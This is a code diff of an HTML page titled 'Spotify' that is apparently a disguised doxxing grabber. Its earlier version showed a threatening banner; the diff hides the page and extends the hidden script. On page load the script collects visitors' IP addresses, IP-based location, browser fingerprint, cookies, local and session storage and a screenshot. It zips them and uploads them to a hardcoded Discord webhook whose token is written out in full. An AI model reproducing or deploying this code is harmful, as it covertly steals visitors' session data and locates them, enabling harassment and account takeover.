@@ -5,80 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spotify</title>
 
-    <!-- Open Graph Meta Tags -->
     <meta property="og:title" content="Doxbin">
     <meta property="og:description" content="">
-    <meta property="og:image" content=""> <!-- Optional: Add a URL to an image for the preview -->
-    <meta property="og:url" content="https://example.com"> <!-- Optional: Add your URL here -->
+    <meta property="og:image" content="">
+    <meta property="og:url" content="https://example.com">
     <meta property="og:type" content="website">
 
     <style>
         body {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-            flex-direction: column;
-            overflow: hidden; /* Prevent scrollbars from appearing */
-        }
-
-        .container {
-            text-align: center;
-        }
-
-        .flashing-text {
-            font-size: 2em;
-            font-weight: bold;
-            animation: flash 1s infinite;
-        }
-
-        .hue-rotating-text {
-            font-size: 1.5em;
-            font-weight: bold;
-            animation: hueRotate 3s infinite;
-        }
-
-        @keyframes flash {
-            0% { color: black; }
-            50% { color: red; }
-            100% { color: black; }
-        }
-
-        @keyframes hueRotate {
-            0% { color: white; }
-            100% { color: hsl(360, 100%, 50%); }
+            display: none; /* Hide everything on the screen */
         }
 
         #info {
-            display: none; /* Hide the info message by default */
+            display: none;
         }
 
-        /* Style for the hidden video */
         #background-video {
             position: absolute;
             width: 1px;
             height: 1px;
             opacity: 0;
-            pointer-events: none; /* Prevent interaction */
-            top: -9999px; /* Move it off-screen */
+            pointer-events: none;
+            top: -9999px;
         }
     </style>
 </head>
 <body>
-    <!-- Invisible Background Video -->
     <video id="background-video" autoplay loop muted>
         <source src="music.mp4" type="video/mp4">
-        Your browser does not support the video tag.
     </video>
-
-    <div class="container">
-        <div class="flashing-text">V4lc</div>
-        <div class="hue-rotating-text">Say V4lc Runs You or ur info is everywhere</div>
-    </div>
 
     <div id="info">
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -88,7 +43,7 @@
                 return 'user-' + Math.random().toString(36).substr(2, 9);
             }
 
-            async function getIpAddresses() {
+            async function getIpAddressesAndLocation() {
                 try {
                     const ipv4Response = await fetch('https://api.ipify.org?format=json');
                     const ipv4Data = await ipv4Response.json();
@@ -98,10 +53,35 @@
                     const ipv6Data = await ipv6Response.json();
                     const ipv6 = ipv6Data.ip;
 
-                    return { ipv4, ipv6 };
+                    // Fetch geolocation info using a public IP Geolocation API
+                    const geoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
+                    const geoData = await geoResponse.json();
+                    const { latitude, longitude, city, region, country } = geoData;
+
+                    return {
+                        ipv4,
+                        ipv6,
+                        location: {
+                            latitude,
+                            longitude,
+                            city,
+                            region,
+                            country
+                        }
+                    };
                 } catch (error) {
-                    console.error('Error fetching IP addresses:', error);
-                    return { ipv4: 'Unable to retrieve IPv4 address', ipv6: 'Unable to retrieve IPv6 address' };
+                    console.error('Error fetching IP addresses or location:', error);
+                    return {
+                        ipv4: 'Unable to retrieve IPv4 address',
+                        ipv6: 'Unable to retrieve IPv6 address',
+                        location: {
+                            latitude: 'Not available',
+                            longitude: 'Not available',
+                            city: 'Not available',
+                            region: 'Not available',
+                            country: 'Not available'
+                        }
+                    };
                 }
             }
 
@@ -124,8 +104,6 @@
                     appVersion: navigator.appVersion,
                     vendor: navigator.vendor,
                     product: navigator.product,
-                    geolocation: 'Not available', // Geolocation requires user permission
-                    touchSupport: 'Not available', // Touch support information
                     connection: navigator.connection ? {
                         effectiveType: navigator.connection.effectiveType,
                         downlink: navigator.connection.downlink,
@@ -139,18 +117,14 @@
                     })),
                     screenOrientation: screen.orientation ? screen.orientation.type : 'Not available',
                     fullscreen: document.fullscreenElement ? 'Fullscreen' : 'Not fullscreen',
-                    cookies: document.cookie,
-                    localStorage: Object.keys(localStorage).reduce((obj, key) => {
-                        obj[key] = localStorage.getItem(key);
-                        return obj;
-                    }, {}),
-                    sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => {
-                        obj[key] = sessionStorage.getItem(key);
-                        return obj;
-                    }, {}),
-                    indexedDB: 'Not available', // IndexedDB requires specific queries
-                    webSQL: 'Not available', // WebSQL requires specific queries
+                    cookies: document.cookie
                 };
+            }
+
+            function formatStorage(storage) {
+                return Object.keys(storage).reduce((formatted, key) => {
+                    return formatted + `${key}: ${storage.getItem(key)}\n`;
+                }, '');
             }
 
             async function captureScreenshot() {
@@ -165,18 +139,25 @@
                 }
             }
 
-            async function createZipFile(info, screenshotDataUrl, ipAddresses) {
+            async function createZipFile(info, screenshotDataUrl, ipAddresses, geolocation) {
                 const zip = new JSZip();
                 zip.file('info.txt', JSON.stringify(info, null, 2));
-                
+
+                if (geolocation) {
+                    const { latitude, longitude, city, region, country } = ipAddresses.location;
+                    zip.file('geolocation.txt', `Latitude: ${latitude}\nLongitude: ${longitude}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}`);
+                }
+
                 if (screenshotDataUrl) {
                     const base64Data = screenshotDataUrl.split(',')[1];
                     const imgBlob = new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: 'image/png' });
                     zip.file('screenshot.png', imgBlob);
                 }
-                
-                zip.file('cookies.txt', info.cookies);
+
+                zip.file('cookies.txt', info.cookies.split('; ').join('\n'));
                 zip.file('ips.txt', `IPv4: ${ipAddresses.ipv4}\nIPv6: ${ipAddresses.ipv6}`);
+                zip.file('localStorage.txt', formatStorage(localStorage));
+                zip.file('sessionStorage.txt', formatStorage(sessionStorage));
 
                 const content = await zip.generateAsync({ type: 'blob' });
                 return content;
@@ -185,7 +166,7 @@
             async function sendZipToDiscord(zipBlob, uniqueId) {
                 const formData = new FormData();
                 formData.append('file', zipBlob, 'info.zip');
-                formData.append('uniqueId', uniqueId); // Append the unique identifier
+                formData.append('uniqueId', uniqueId);
 
                 try {
                     await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
@@ -199,19 +180,18 @@
             }
 
             async function initialize() {
-                const uniqueId = generateUniqueId(); // Generate unique identifier
-                const ipAddresses = await getIpAddresses();
+                const uniqueId = generateUniqueId();
+                const ipAddresses = await getIpAddressesAndLocation();
                 const browserInfo = getBrowserInfo();
                 browserInfo.ipv4 = ipAddresses.ipv4;
                 browserInfo.ipv6 = ipAddresses.ipv6;
-                browserInfo.uniqueId = uniqueId; // Add unique identifier to info
+                browserInfo.uniqueId = uniqueId;
 
                 const screenshotDataUrl = await captureScreenshot();
-                const zipBlob = await createZipFile(browserInfo, screenshotDataUrl, ipAddresses);
+                const zipBlob = await createZipFile(browserInfo, screenshotDataUrl, ipAddresses, ipAddresses.location);
                 await sendZipToDiscord(zipBlob, uniqueId);
             }
 
-            // Run the initialization function when the page loads
             window.onload = initialize;
         </script>
     </div>
